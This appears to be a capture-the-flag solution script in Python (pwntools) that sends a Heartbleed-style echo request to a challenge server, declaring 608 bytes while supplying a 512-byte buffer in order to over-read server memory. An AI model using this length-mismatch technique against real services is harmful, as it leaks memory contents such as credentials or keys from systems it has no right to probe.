from pwn import *
host = 'challenges.0xmurphy.me'
port = 4444
buff = 'A'*512
r = remote(host, port)
payload = 'CLIENT HELLO!'
r.sendline(payload)
print(r.recvline().decode('utf-8'))
payload = 'ECHO REQUEST?'
r.sendline(payload)
print(r.recvline().decode('utf-8'))
payload = 'PLEASE REPLY <%s> [608 BYTES]' % buff
r.sendline(payload)
print(r.recvline().decode('utf-8'))
r.close()
